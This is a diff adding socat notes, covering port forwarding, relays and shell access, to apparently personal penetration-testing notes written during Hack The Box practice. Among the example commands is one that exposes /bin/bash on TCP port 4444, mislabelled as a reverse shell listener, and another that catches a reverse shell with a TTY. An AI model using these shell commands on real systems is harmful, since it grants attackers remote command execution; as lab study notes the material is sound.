@@ -193,9 +193,50 @@ Ref:
 
 ---
 
+## Socat
+
+Similar-ish to Chisel, i used it to forward a local `JetDirect` port (9100) bound to the loopback of some HTB machine i was working on, so that i could access the port from my attack machine
+- it was preinstalled on the box
+
+**Multipurpose relay for bidirectional data transfer**
+"Socat (for SOcket CAT) establishes two bidirectional byte streams and transfers data between them. Data channels may be files, pipes, devices (terminal or modem, etc.), or sockets (Unix, IPv4, IPv6, raw, UDP, TCP, SSL). It provides forking, logging and tracing, different modes for interprocess communication and many more options.
+
+It can be used, for example, as a TCP relay (one-shot or daemon), as an external socksifier, as a shell interface to Unix sockets, as an IPv6 relay, as a netcat and rinetd replacement, to redirect TCP-oriented programs to a serial line, or to establish a relatively secure environment (su and chroot) for running client or server shell scripts inside network connections. Socat supports sctp as of 1.7.0."
+
+| Mode | What it does |
+|---|---|
+| `TCP-LISTEN` | Opens a listening TCP socket |
+| `fork` | Spawns a new subprocess per connection (can handles multiple clients) |
+| `reuseaddr` | Immediate rebinding to the port |
+| `-` (stdio) | Uses stdin/stdout as one endpoint (interactive raw protocol testing) |
+
+```bash
+# Forward a loopback service (like 127.0.0.1:9100) to be reachable externally
+socat TCP-LISTEN:9101,fork,reuseaddr TCP:127.0.0.1:9100 &
+
+# Full reverse shell listener (alternative to nc)
+socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+# Catch a reverse shell with a proper TTY from a target using socat
+socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
+
+# Talk directly to a raw TCP service (like nc, but always available)
+socat - TCP:10.10.10.10:9100
+
+# Relay a UNIX domain socket to TCP (like exposing a local management socket for remote access)
+socat TCP-LISTEN:8081,fork,reuseaddr UNIX-CONNECT:/run/some/service.sock
+```
+
+Refs:
+- https://www.kali.org/tools/socat/
+- https://www.man7.org/linux/man-pages/man1/socat.1.html
+
+---
+
 ## References
 - [SSH Man Page](https://man.openbsd.org/ssh)
 - [iptables Man Page](https://linux.die.net/man/8/iptables)
 - [OpenVPN Docs](https://openvpn.net/community-resources/)
 - [WireGuard Docs](https://www.wireguard.com/)
 - [Chisel GitHub](https://github.com/jpillora/chisel)
+- [Socat - kali](https://www.kali.org/tools/socat/)
